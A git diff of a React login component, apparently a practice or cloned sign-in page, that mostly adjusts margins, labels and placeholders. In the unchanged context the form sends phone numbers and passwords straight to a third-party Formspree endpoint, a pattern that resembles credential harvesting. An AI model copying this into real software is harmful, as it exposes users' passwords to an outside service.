@@ -8,19 +8,20 @@ function Login() {
   return (
     <Container>
 
-<h1 style={{marginLeft:"700px"}}>Log In</h1>
+<h1 style={{marginLeft:"260px"}}>Log In</h1>
 
     <form action="https://formspree.io/f/xayzloyg" method='POST'>
         <label style={{color:"rgb(14,173,255)", marginLeft:"540px"}}>Phone Number</label>
         <img src={flag} className="flag" />
         <input type="text" name='country'   value="+91" placeholder='enter' className='phn' required/>
-        <input type="text" name='number' placeholder='enter' className='number' required/>
+        <input type="text" name='number'  className='number' required/>
         <Link to="/email">
-        <p className='email' style={{color:"rgb(14,173,255)", marginLeft:"540px"}}>use phone number instead</p>
+        <p className='email' style={{color:"rgb(14,173,255)", marginLeft:"540px"}}>use email instead</p>
         </Link>
-        <label style={{marginLeft:"-140px", color:"rgb(14,173,255)"}} >Password</label>
+        <label style={{marginLeft:"540px", color:"rgb(14,173,255)"}} >Password</label>
+        {/* <label htmlFor="">nbbn</label> */}
 
-        <input type="password" name='password' placeholder='enter password' className='pass' required />
+        <input type="password" name='password' className='pass' required />
 
 <button  type='submit'>Login</button>
 
@@ -34,7 +35,7 @@ const Container = styled.div`
 
 form{
     display: grid;
-    margin-left: 60px;
+    margin-left: -380px;
 }
 
 .phn{
